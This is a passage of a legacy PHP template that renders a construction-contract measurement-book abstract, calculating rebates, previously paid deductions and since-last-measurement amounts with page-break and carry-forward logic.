			<td align="right"><?php echo number_format($SlmNetAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
		<?php }else{  
			if(($SuppRebateArr[$prev_supp_sheetid_temp] != 0)&&($SuppRebateArr[$prev_supp_sheetid_temp] != "")){
				$SuppRebateperc = $SuppRebateArr[$prev_supp_sheetid_temp];
				$SuppAgmtSlmRebateAmount 		=  round(($SLMAmountNI_DI_EI * $SuppRebateperc /100),2);
				$SuppAgmtDpmRebateAmount 		=  round(($DPMAmountNI_DI_EI * $SuppRebateperc /100),2);
				$SuppAgmtSlmDpmRebateAmount 	=  round(($UPTOAmountNI_DI_EI * $SuppRebateperc /100),2);
				
				$SLMAmountNI_DI_EI 			=  round(($SLMAmountNI_DI_EI - $SuppAgmtSlmRebateAmount),2); 
				$DPMAmountNI_DI_EI 			=  round(($DPMAmountNI_DI_EI - $SuppAgmtDpmRebateAmount),2); 
				$UPTOAmountNI_DI_EI 		=  round(($UPTOAmountNI_DI_EI - $SuppAgmtSlmDpmRebateAmount),2);
		?>
		<tr class="labelprint">
			<td colspan="2" align="right">Less Over All Rebate : <?php echo $SuppRebateperc; ?>%&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px; font-weight:normal;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SuppAgmtSlmDpmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SuppAgmtDpmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SuppAgmtSlmRebateAmount, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
		<tr class="labelbold" bgcolor="#F0F0F0">
			<td colspan="2" align="right">Gross Amount&nbsp;&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($UPTOAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($DPMAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
			<td align="right"><?php echo number_format($SLMAmountNI_DI_EI, 2, '.', ''); ?></td>
			<td>&nbsp;</td>
		</tr>
		<?php		
			} 
		 } ?>
		<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
		</table>
		<p style='page-break-after:always;'></p>
		<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
			<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?> <!--(Print version : <?php echo $gen_version; ?>)-->&nbsp;&nbsp;</td></tr>
		</table>
<?php
		//$no_of_supp_agg = getSuppAggNoOf($abstsheetid,$supp_sheetid);
		if($SUPAG == ""){
		$SUPAG1 = "Part Agreement - 1";	
		}else{
		$SUPAG1 = "Part Agreement - 2";
		}
		$SUPAG = "x";
		echo "<div width='100%' align='center' class='labelbold'><u>".$SUPAG1."</u></div>";
		$table_supp = GetSupplementaryWorkTitle($supp_sheetid,$runn_acc_bill_no);
		echo $table_supp;
		echo "<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>";
		echo $tablehead;
		//$DI_Amount_EI_Amount_Str .= $SLMAmountNI_DI_EI."*".$DPMAmountNI_DI_EI."*".$UPTOAmountNI_DI_EI."*".$page."*".$abstmbno."*".$txtbox_id_di_ei."@@";
		//$no_of_supp_agg++;
		if($prev_item_flag == "NI")
		{
			$AggTitleFlag = "Main Agreement - ";
			//$no_of_supp_agg++;
			$DI_Amount_EI_Amount_Str .= $SlmNetAmount."*".$DpmNetAmount."*".$SlmDpmNetAmount."*".$page."*".$abstmbno."*".$txtbox_id_di_ei."*".$AggTitleFlag."@@";
		}
		else
		{
			$AggTitleFlag = "Part Agreement - ".$no_of_supp_agg; //$no_of_supp_agg++;	
			$DI_Amount_EI_Amount_Str .= $SLMAmountNI_DI_EI."*".$DPMAmountNI_DI_EI."*".$UPTOAmountNI_DI_EI."*".$page."*".$abstmbno."*".$txtbox_id_di_ei."*".$AggTitleFlag."@@";
		}
		
		$DIHead = 1; $Line = $LineIncr+$Linecheck; $page++; $LineTemp = 0;
		$SLMAmountNI_DI_EI = 0;
		$DPMAmountNI_DI_EI = 0;
		$UPTOAmountNI_DI_EI = 0;
		$txtbox_id_di_ei++; 
	}
}
/*************************************** THIS PART IS FOR DISPLAY SUPPLEMENTARY AGREEMNT TITLE SECTION   - ENDS HERE ****************************************/


/*if($EIHead == 0)
{
	if($item_flag == "EI")
	{
?>
		<tr>
			<td colspan='3' align='right' class='labelbold'>C/o Page No / Abstract MB No </td>
			<td></td>
			<td></td>
			<td align='right' class='labelbold'></td>
			<td></td>
			<td></td>
			<td align='right' class='labelbold'></td>
			<td></td>
			<td align='right' class='labelbold'></td>
			<td></td>
		</tr>
		<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
		</table>
		<p style='page-break-after:always;'></p>
		<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
			<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?>&nbsp;&nbsp;</td></tr>
		</table>
<?php 
		echo "<div width='100%' align='center' class='labelbold'><u>Supplementary Agreement for <i>Extra Item</i></u></div>";
		$table_supp = GetSupplementaryWorkTitle($supp_sheetid,$runn_acc_bill_no);
		echo $table_supp;
		echo "<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>";
		echo $tablehead;
		$EIHead = 1;
	}
	//$Line = $LineIncr+$Linecheck; $page++;
}*/

if($LineTemp >= 34){ $Line = 34; $LineTemp = 0; }
if($Line >= 34)
{
?>
<tr>
	<td colspan='3' align='right' class='labelbold'>C/o Page No <?php if($page >= 100){ echo $NextMBPageList[$NextMbIncr]; ?>/ Abstract MB No <?php echo $NextMBList[$NextMbIncr]; }else{ echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; } ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($UPTOAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($DPMAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($SLMAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td><?php //echo $LineTemp; ?></td>
</tr>
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
</table>
<p style='page-break-after:always;'></p>
<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
	<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php if($page >= 100){ echo $NextMBList[$NextMbIncr]; }else{ echo $abstmbno; } ?> <!--(Print version : <?php echo $gen_version; ?>)-->&nbsp;&nbsp;</td></tr>
</table>
<?php 
if($item_flag == "NI"){
	echo $table;
}else{
	$table_supp = GetSupplementaryWorkTitle($supp_sheetid,$runn_acc_bill_no);
	//if($item_flag == "DI"){
	//echo "<div width='100%' align='center' class='labelbold'><u>Supplementary Agreement for <i>Deviated Item</i></u></div>";
	//}else if($item_flag == "EI"){
	//echo "<div width='100%' align='center' class='labelbold'><u>Supplementary Agreement for <i>Extra Item</i></u></div>";
	//}else{
	//echo "";
	//}
	echo $table_supp;
}
?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
<?php echo $tablehead; ?>
<tr>
	<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($UPTOAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($DPMAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($SLMAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td><?php //echo $LineIncr."*".$Linecheck; ?></td>
</tr>
<?php
$Line = $LineIncr+$Linecheck; $page++;
}
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
//--*************THIS PART IS FOR " PRINT " Item Name, Description and Check Box  SECTION********************//
?>
<input type="hidden" name="hid_item_str" id="hid_item_str<?php echo $subdivid; ?>" value="<?php echo $item_str; ?>" />
<tr border='1' bgcolor="" class="labelprint">
	<!--<td  align='center' width='' class='labelsmall' style=" border-top-color:#666666; border-bottom-color:#0A9CC5; background-color:#0A9CC5" id="td_popupbutton<?php echo $table_group_row; ?>">
		<input type="checkbox" name="check" id="ch_item<?php //echo $table_group_row; ?>" value="<?php //echo $checkbox_str; ?>"  />
	</td>-->
	<td width="61px" align="center" style="border-top-color:#666666;" class="">
		<?php echo $subdivname;?>
	</td>
	<td colspan="8" style="border-top-color:#666666;" class="">
		<?php echo $description; ?>
	</td>
	<td style="border-top-color:#666666;" width="40px"><?php //echo $slm_cnt."**".$dpm_cnt; ?>&nbsp;</td>
	<td style="border-top-color:#666666;" width="40px"><?php //echo $Line; ?>&nbsp;</td>
	<td style="border-top-color:#666666;" width="40px"><?php //echo $Line; ?>&nbsp;</td>
</tr>
<?php 
$rowcount++; $Line++;//echo "A = ".$Line."<br/>";
// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page);  $Line = $LineIncr; $page++; echo $slm_amount_item."<br/>"; }
//--*************THIS PART IS FOR " PRINT " DEDUCT PREVIOUS MEASUREMENT ( D.P.M. ) SECTION*****************//
	$QtyDpmSlm_4 = 0;	$PercDpmSlm_4 = 0;	$Dpm_Slm_Amount_4 = 0;	$total_percent_dpm_slm_4 = 0;
	$QtyDpmSlm_3 = 0;	$PercDpmSlm_3 = 0;	$Dpm_Slm_Amount_3 = 0;	$total_percent_dpm_slm_3 = 0;
	$QtyDpmSlm_2 = 0;	$PercDpmSlm_2 = 0;	$Dpm_Slm_Amount_2 = 0;	$total_percent_dpm_slm_2 = 0;
	$QtyDpmSlm_1 = 0;	$PercDpmSlm_1 = 0;	$Dpm_Slm_Amount_1 = 0;	$total_percent_dpm_slm_1 = 0;

	if($dpm_cnt > 0)
	{
		$eplodedpm = explode("*", rtrim($dpm_mesurementbook_details,"*"));
		//echo "D = ".count($eplodedpm)."<br/>";
		//echo rtrim($dpm_mesurementbook_details,"*")."<br/>";
		 $DpmTemp = 0;
		for($x4=0; $x4<count($eplodedpm); $x4+=13)
		{
			$dpmqty 				= $eplodedpm[$x4+1];
			//echo $eplodedpm."<br/>";
			$remarks 				= $eplodedpm[$x4+10];
			$rbnDpm					= $eplodedpm[$x4+11];
			$MeasurementbookidDpm	= $eplodedpm[$x4+12];
			$paymentpercent_dpm 	= $eplodedpm[$x4+7];
			$dpmamt 				= $dpmqty * $rate * $paymentpercent_dpm / 100;
			$dummy=0;
			//print_r($DpmArrMbidList);echo "<br/>";
			if(in_array($MeasurementbookidDpm, $DpmArrMbidList)) 
			{ //echo $dpmqty."<br/>";
				$ArrUniqueVal 	= array_unique($DpmArrMbidList);
				$UniqueCount 	= count($ArrUniqueVal);
				$x6=0;
				$count_1 		= count($DpmArrAmbList);
				$count_2 		= count($DpmArrAmbPgList);
				$AMBookNo 		= $DpmArrAmbList[$count_1-1];
				$AMBookPage 	= $DpmArrAmbList[$count_2-1];
				while($x6<=$UniqueCount)
				{
					$StartKey = $ArrUniqueVal[$x6];
					$PaidDpmPerc = $DpmArrPercent[$StartKey];
					$rowspancnt = $dpm_cnt;//$UniqueCount+$DpmTemp;
					$DpmKeyresult = checkPartpayment($DpmArrMbidList,$StartKey);
					$DpmPercSum = $PaidDpmPerc;
					if($DpmKeyresult != "")
					{
						$explodeDpmKeyresult = explode("*",$DpmKeyresult);
						for($x7=0; $x7<count($explodeDpmKeyresult); $x7++)
						{
							$key = $explodeDpmKeyresult[$x7];
							$DpmPercSum = $DpmPercSum + $DpmArrPayPercentList[$key];
						}
						if(($x6 == 0)&&($DpmTemp == 0))
						{
						$DpmQuantityty_1 = $DpmArrQuantityList[$key];
						$DpmAmount_1 = $DpmQuantityty_1 * $rate * $DpmPercSum /100;
							if(in_array($StartKey, $SlmArrMbidList))
							{
								$Arrkey = array_search($StartKey, $SlmArrMbidList);
								$QtyDpmSlm_1 = $SlmArrQuantityList[$Arrkey];
								$PercDpmSlm_1 = $SlmArrPayPercentList[$Arrkey];
								$Dpm_Slm_Amount_1 = $QtyDpmSlm_1 * $PercDpmSlm_1 * $rate/100;
							}
						$total_percent_dpm_slm_1 = $DpmPercSum+$PercDpmSlm_1;
						
?>
					<tr border='1' bgcolor="#FFFFFF" class="labelprint">
						<td  align='center' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='left' width='180px' class='' rowspan="<?php echo $rowspancnt; ?>" style="font-size:10px;"><?php echo "Prev-Qty Vide P ".$AbstractMbookPageNoDpm."/Abstract MB No.".$AbstractMbookNoDpm; ?></td>
						<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>"><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
						<td  align='left' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='left' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>"></td>
						<td  align='right' width='' class=''><?php echo $DpmQuantityty_1;//$QtyDpmSlm_1; ?></td>
						<td  align='right' width='' class=''>
							<?php 
							//// This is for Deduct Previous Amount for Mechanical undated on 19/02/2019
							if(($QSPPDPMMasterArr[$StartKey] != '') && ($QSPPDPMMasterArr[$StartKey] != 0)){
								//echo number_format($QSPPDPMMasterArr[$StartKey], 2, '.', '');
								$DpmAmount_1 = $DpmAmount_1 + $QSPPDPMMasterArr[$StartKey];
							}
							echo number_format($DpmAmount_1, 2, '.', '');
							$dpm_amount_item 		= $dpm_amount_item + $DpmAmount_1;
							?>
						</td>
						<td  align='right' width='6%' class='' rowspan=""></td>
						<td  align='right' width='3%' class='' rowspan="">
						<?php
						if(($QSPPSLMMasterArr[$StartKey] != '') && ($QSPPSLMMasterArr[$StartKey] != 0)){
							echo number_format($QSPPSLMMasterArr[$StartKey], 2, '.', '');
							$slm_amount_item = $slm_amount_item + $QSPPSLMMasterArr[$StartKey];
						}else{	
							if(in_array($StartKey, $SlmArrMbidList))
							{
								echo number_format($Dpm_Slm_Amount_1, 2, '.', ''); 
								$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_1;
							}
						} 
						?>
						</td>
						<td  align='center' width='40px' class='' rowspan="" style="font-size:9px;">
						<?php 
						if((($QSPPSLMMasterArr[$StartKey] != '') && ($QSPPSLMMasterArr[$StartKey] != 0))||(($QSPPDPMMasterArr[$StartKey] != '') && ($QSPPDPMMasterArr[$StartKey] != 0))){
							echo "P-".$QSPPRefMBPageArr[$StartKey][1]."/".$QSPPRefMBPageArr[$StartKey][0];
						}else{
							if(in_array($StartKey, $SlmArrMbidList))
							{
								echo $total_percent_dpm_slm_1."% Paid"; 
							}
						}
							?>
						</td>
					</tr>

<?php					$rowcount++;	
						}
						
						else
						{ 
							if(in_array($StartKey, $SlmArrMbidList))
							{
								$Arrkey = array_search($StartKey, $SlmArrMbidList);
								$QtyDpmSlm_2 = $SlmArrQuantityList[$Arrkey];
								$PercDpmSlm_2 = $SlmArrPayPercentList[$Arrkey];
								$Dpm_Slm_Amount_2 = $QtyDpmSlm_2 * $PercDpmSlm_2 * $rate/100;
								$total_percent_dpm_slm_2 = $DpmPercSum+$PercDpmSlm_2;
								
							}
							if(in_array($StartKey, $DpmArrMbidList))
							{ 
								$Arrkey = array_search($StartKey, $DpmArrMbidList);
								$QtyDpmSlm_22 = $DpmArrQuantityList[$Arrkey];
								$PercDpmSlm_22 = $DpmPercSum;//$DpmArrPayPercentList[$Arrkey];
								$Dpm_Slm_Amount_22 = $QtyDpmSlm_22 * $PercDpmSlm_22 * $rate/100;
								$total_percent_dpm_slm_22 = $DpmPercSum+$PercDpmSlm_22;
								
							}
							/*else
							{
								$QtyDpm_5 = $DpmArrQuantityList[$key];
								//$Dpm_Slm_Amount_2 = $QtyDpm_5 * 100 * $rate/100;
								$Dpm_Slm_Amount_2 = $QtyDpm_5 * $DpmPercSum * $rate/100;
							}*/
?>
							<tr border='1' bgcolor="#FFFFFF" class="labelprint">
								<td  align='right' width='' class=''><?php echo $DpmArrQuantityList[$key]; ?></td>
								<td  align='right' width='' class=''>
								<?php 
									//// This is for Deduct Previous Amount for Mechanical undated on 19/02/2019
									if(($QSPPDPMMasterArr[$StartKey] != '') && ($QSPPDPMMasterArr[$StartKey] != 0)){
										//echo number_format($QSPPDPMMasterArr[$StartKey], 2, '.', '');
										$Dpm_Slm_Amount_22 = $Dpm_Slm_Amount_22 + $QSPPDPMMasterArr[$StartKey];
									}
									echo number_format($Dpm_Slm_Amount_22, 2, '.', ''); 
									$dpm_amount_item = $dpm_amount_item + $Dpm_Slm_Amount_22; 
								?>
								</td>
								<td  align='right' width='' class=''></td>
								<td  align='right' width='' class=''>
								<?php
								if(($QSPPSLMMasterArr[$StartKey] != '') && ($QSPPSLMMasterArr[$StartKey] != 0)){
									echo number_format($QSPPSLMMasterArr[$StartKey], 2, '.', '');
									$slm_amount_item = $slm_amount_item + $QSPPSLMMasterArr[$StartKey];
								}else{
									if(in_array($StartKey, $SlmArrMbidList))
									{
										echo number_format($Dpm_Slm_Amount_2, 2, '.', ''); 
										$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_2;
									} 
								}
								?>
								</td>
								<td  align='center' width='40px' class='' rowspan="" style="font-size:9px;">
								<?php 
								if((($QSPPSLMMasterArr[$StartKey] != '') && ($QSPPSLMMasterArr[$StartKey] != 0))||(($QSPPDPMMasterArr[$StartKey] != '') && ($QSPPDPMMasterArr[$StartKey] != 0))){
									echo "P-".$QSPPRefMBPageArr[$StartKey][1]."/".$QSPPRefMBPageArr[$StartKey][0];
								}else{
									if(in_array($StartKey, $SlmArrMbidList))
									{
										echo $total_percent_dpm_slm_2."% Paid"; 
									}
									else{
										echo $DpmPercSum."% Paid";
									}
								}
								?>
								</td>
							</tr>
		<?php				$rowcount++;		
						}
						
					}
					$DpmArrMbidList = removeArray($DpmKeyresult,$DpmArrMbidList);
					$x6++;	
					array_push($temp_array,$StartKey);
				}
				//$Line = $Line + $rowspancnt;//echo "B = ".$rowspancnt."<br/>";
				// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++; echo $slm_amount_item."<br/>";}
			}
							//********** THIS PART IS FOR NOW PAYING (SLM) - DEDUCT PREVIOUS MEASUREMENT **********//
			$PercDpmSlm_3 = 0; 	$Dpm_Slm_Amount_4 = 0;		
			if(in_array($MeasurementbookidDpm, $temp_array))
			{
				$dummy = 1;
			}
			else
			{ 
				if($x4 == 0)
				{ 
					if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
					{
						$Arrkey2 = array_search($MeasurementbookidDpm, $SlmArrMbidList);
						$QtyDpmSlm_3 = $SlmArrQuantityList[$Arrkey2];
						$PercDpmSlm_3 = $SlmArrPayPercentList[$Arrkey2];
						$Dpm_Slm_Amount_3 = $QtyDpmSlm_3 * $PercDpmSlm_3 * $rate /100;
					}
					$total_percent_dpm_slm_3 = $paymentpercent_dpm + $PercDpmSlm_3;
?>
					<tr border='1' bgcolor="#FFFFFF" class="labelprint">
						<!--<td  align='left' width='3%' class=''>&nbsp;</td>-->
						<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='left' width='' class='' style="font-size:10px;" rowspan="<?php echo $dpm_cnt; ?>"><?php echo "Prev-Qty Vide P ".$AbstractMbookPageNoDpm."/Abstract MB No.".$AbstractMbookNoDpm; ?></td>
						<td  align='right' width='' class='' rowspan="<?php echo $dpm_cnt; ?>"><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
						<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='right' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='right' width='' class=''>
							<?php 
								echo number_format($dpmqty, $decimal, '.', ''); 
								
							?>
						</td>
						<td  align='right' width='' class=''>
							<?php 
								//// This is for Deduct Previous Amount for Mechanical undated on 19/02/2019
								if(($QSPPDPMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPDPMMasterArr[$MeasurementbookidDpm] != 0)){
									//echo number_format($QSPPDPMMasterArr[$MeasurementbookidDpm], 2, '.', '');
									$dpmamt = $dpmamt + $QSPPDPMMasterArr[$MeasurementbookidDpm];
								}
								
								echo number_format($dpmamt, 2, '.', ''); 
								$dpm_amount_item 		= $dpm_amount_item + $dpmamt;
							?>
						</td>
						<td  align='right' width='' class='' rowspan="<?php if($dummy == 1) { echo $dpm_cnt; } ?>"></td>
						<td  align='right' width='' class='' rowspan="<?php if($dummy == 1) { echo $dpm_cnt; } ?>">
							<?php 
							if(($QSPPSLMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPSLMMasterArr[$MeasurementbookidDpm] != 0)){
								echo number_format($QSPPSLMMasterArr[$MeasurementbookidDpm], 2, '.', '');
								$slm_amount_item = $slm_amount_item + $QSPPSLMMasterArr[$MeasurementbookidDpm];
							}else{
								if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
								{
									echo number_format($Dpm_Slm_Amount_3, 2, '.', '');
									$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_3;
								}
							}
							?>
						</td>
						<td  align='center' width='' class='' rowspan="" style="font-size:9px;">
							<?php 
							//if(($QSPPSLMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPSLMMasterArr[$MeasurementbookidDpm] != 0)){
							if((($QSPPSLMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPSLMMasterArr[$MeasurementbookidDpm] != 0))||(($QSPPDPMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPDPMMasterArr[$MeasurementbookidDpm] != 0))){
								echo "P-".$QSPPRefMBPageArr[$MeasurementbookidDpm][1]."/".$QSPPRefMBPageArr[$MeasurementbookidDpm][0];
							}else{
								echo $total_percent_dpm_slm_3."% Paid";
							}
							?>
						</td>
					</tr>	
<?php 			$rowcount++;
				}
				if(($dpm_cnt > 1) && ($x4 != 0))
				{
					$PaidDpmPerc2 = 0;
					$PaidDpmPerc2 = $paymentpercent_dpm;
					if(in_array($MeasurementbookidDpm, $DpmArrMbidList)){
						$ArrUniqueVal2 	= array_unique($DpmArrMbidList); 
						$UniqueCount2 	= count($ArrUniqueVal2); 
						foreach($ArrUniqueVal2 as $StartKey2=>$StartKey2Val){
							$PaidDpmPerc2 	= $PaidDpmPerc2+$DpmArrPayPercentList[$StartKey2]; 
							$DpmKeyresult2 	= checkPartpayment($DpmArrMbidList,$StartKey2);
							if($DpmKeyresult2 != ""){
								$explodeDpmKeyresult2 = explode("*",$DpmKeyresult2); 
								for($z7=0; $z7<count($explodeDpmKeyresult2); $z7++){
									$key2 		= $explodeDpmKeyresult2[$z7];
									$PaidDpmPerc2 = $PaidDpmPerc2 + $DpmArrPayPercentList[$key2]; 
								}
							}
						}
					}
					$paymentpercent_dpmA = 0; $PercDpmSlm_4 = 0;
					$paymentpercent_dpmA = $PaidDpmPerc2;
					$dpmamtA 				= $dpmqty * $rate * $PaidDpmPerc2 / 100;
					if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
					{
						$Arrkey2 = array_search($MeasurementbookidDpm, $SlmArrMbidList);
						$QtyDpmSlm_4 = $SlmArrQuantityList[$Arrkey2];
						$PercDpmSlm_4 = $SlmArrPayPercentList[$Arrkey2];
						$Dpm_Slm_Amount_4 = $QtyDpmSlm_4 * $PercDpmSlm_4 * $rate /100;
					}
					$total_percent_dpm_slm_4 = $paymentpercent_dpmA + $PercDpmSlm_4;
?>
				<tr border='1' bgcolor="#FFFFFF" class="labelprint">
					<td  align='right' width='' class=''><?php echo number_format($dpmqty, $decimal, '.', ''); ?></td>
					<td  align='right' width='' class=''>
					<?php 
						//// This is for Deduct Previous Amount for Mechanical undated on 19/02/2019
						if(($QSPPDPMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPDPMMasterArr[$MeasurementbookidDpm] != 0)){
							//echo number_format($QSPPDPMMasterArr[$MeasurementbookidDpm], 2, '.', '');
							$dpmamtA = $dpmamtA + $QSPPDPMMasterArr[$MeasurementbookidDpm];
						}
						echo number_format($dpmamtA, 2, '.', ''); 
						$dpm_amount_item  = $dpm_amount_item + $dpmamtA; 
					?>
					</td>
					<?php 
					if($dummy == 0) 
					{
					?>
						<td  align='right' width='' class=''></td>
						<td  align='right' width='' class=''>
							<?php 
							if(($QSPPSLMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPSLMMasterArr[$MeasurementbookidDpm] != 0)){
								echo number_format($QSPPSLMMasterArr[$MeasurementbookidDpm], 2, '.', '');
								$slm_amount_item = $slm_amount_item + $QSPPSLMMasterArr[$MeasurementbookidDpm];
							}else{
								if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
								{
									echo number_format($Dpm_Slm_Amount_4, 2, '.', '');
									$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_4;
								}
							}
							?>
						</td>
						<td  align='center' width='' class='' rowspan="" style="font-size:9px;">
							<?php
							//if(($QSPPSLMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPSLMMasterArr[$MeasurementbookidDpm] != 0)){
							if((($QSPPSLMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPSLMMasterArr[$MeasurementbookidDpm] != 0))||(($QSPPDPMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPDPMMasterArr[$MeasurementbookidDpm] != 0))){
								echo "P-".$QSPPRefMBPageArr[$MeasurementbookidDpm][1]."/".$QSPPRefMBPageArr[$MeasurementbookidDpm][0];
							}else{
								//if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
								//{
									echo $total_percent_dpm_slm_4."% Paid";
								//}
							}
							?>
						</td>
					<?php 
					} 
					?>
				</tr>
<?php	
				$rowcount++;
				}
			}
			//$Line = $Line + $dpm_cnt;//echo "C = ".$dpm_cnt."<br/>";
			// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
			$DpmTemp++; 
		}
		//$rowcount++;
	}
//*************THIS PART IS FOR " PRINT " ---- SINCE LAST MEASUREMENT ( S.L.M. ) SECTION*******************//
?>
<?php
	$slm_dpm_str = $slm_measurement_qty."*".$dpm_measurement_qty;
	$mbooktype_query = "select flag from measurementbook WHERE subdivid = '$subdivisionlist[$i]' AND sheetid = '$abstsheetid'";
	$mbooktype_sql = mysql_query($mbooktype_query);
	$flagtype = @mysql_result($mbooktype_sql,0,'flag');
	if($flagtype == 1) { $mbookdescription = "/MBook No. "; }
	if($flagtype == 2) { $mbookdescription = "/MBook No. "; }

	if($slm_cnt > 0)
	{
		$eplodeslm = explode("*", rtrim($slm_mesurementbook_details,"*"));
		//echo "B = ".count($eplodeslm)."<br/>";
		for($x3=0; $x3<count($eplodeslm); $x3+=12)
		{
			$slmqty = $eplodeslm[$x3+1];
			
			$remarks = $eplodeslm[$x3+10];
			$paymentpercent = $eplodeslm[$x3+7];
			$slmamt = $slmqty * $rate * $paymentpercent / 100;
			$slm_amount_item = round(($slm_amount_item + $slmamt),2);
			if($x3 == 0)
			{
?>
		<tr border='1' bgcolor="#FFFFFF" class="labelprint">
			<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='left' width='' class='' style="font-size:10px;" rowspan="<?php echo $slm_cnt; ?>"><?php echo "Qty Vide P ".$mbpageno_slm.$mbookdescription.$mbookno_slm; ?></td>
			<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>"><?php echo number_format($slm_measurement_qty, $decimal, '.', ''); ?></td>
			<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
